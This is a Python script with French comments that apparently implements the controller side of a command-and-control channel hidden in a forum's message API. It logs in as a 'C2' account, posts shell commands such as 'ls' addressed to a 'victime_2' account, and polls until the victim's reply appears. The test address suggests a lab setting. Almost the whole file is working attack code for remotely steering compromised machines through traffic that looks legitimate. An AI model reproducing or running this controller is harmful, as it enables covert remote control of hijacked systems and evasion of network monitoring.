import requests
import time

class Forum:
    def __init__(self, ip, port, user, password, name_victime="victime_2"):
        self.ip = ip
        self.port = port
        self.user = user
        self.password = password
        self.find = False
        self.num_commande = 1
        self.name = name_victime

        # dernier message connu
        self.last = {'body': 'vide', 'id': 0, 'username': 'C2'}

    def generate_user_key(self):
        # génère un token
        response = requests.post(
            f"http://{self.ip}:{self.port}/api/auth/login",
            json={"username": self.user, "password": self.password},
        )
        response.raise_for_status()
        return response.json()["token"]

    def execute(self, commande):
        self.find = False
        token = self.generate_user_key()

        # 1. Récupère tous les messages pour connaître le dernier id de la victime
        response = requests.get(
            f"http://{self.ip}:{self.port}/api/messages",
            headers={"Authorization": f"Bearer {token}"},
        )
        messages = response.json()
        last_id = max((m["id"] for m in messages if m["username"] == self.name), default=0)

        # 2. Envoie la commande
        requests.post(
            f"http://{self.ip}:{self.port}/api/messages",
            headers={"Authorization": f"Bearer {token}"},
            json={"body": commande},
        )

        # Attendre une réponse de la victime avec un id > last_id
        while not self.find:
            response = requests.get(
                f"http://{self.ip}:{self.port}/api/messages",
                headers={"Authorization": f"Bearer {token}"},
            )
            messages = response.json()

            for message in messages:
                if message["username"] == self.name and message["id"] > last_id:
                    # nouveau message trouvé
                    self.last = message.copy()
                    print("nouveau message trouvé :", self.last)
                    self.find = True
                    break

            if not self.find:
                print("not find, attente 10s...")
                time.sleep(10)

        # incrémente le compteur de commandes envoyées
        self.num_commande += 1
        return self.last["body"]


# utilisation
victime_2 = Forum("192.168.56.1", 6000, "C2", "testtest", "victime_2")
print(victime_2.execute("ls"))
